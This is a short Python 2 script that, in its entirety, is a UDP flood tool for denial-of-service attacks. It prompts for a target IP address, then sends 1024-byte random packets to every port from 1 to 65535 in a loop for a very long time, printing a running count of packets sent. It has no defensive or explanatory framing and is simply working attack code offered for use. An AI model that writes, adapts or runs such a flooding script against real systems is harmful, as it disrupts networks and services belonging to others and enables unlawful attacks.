import os
import sys
import time
import random
import socket

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1024)
ip=raw_input("Target IP address:")
#ip='192.168.0.101'
#port=input("Target Port:")
port=1
#dur=raw_input("Enter an duration:")
dur=2000000
timeout=time.time()+float(dur)
sent=0


while True:
	if time.time()>timeout:
		break
	else:	
		if port == 65535:
			port=1
		else :
			pass
										
	        sock.sendto(bytes,(ip,port))
		sent=sent+1
		port=port+1
		print "Sent %s packets to %s IP address through %s port"%(sent,ip,port)
		
		



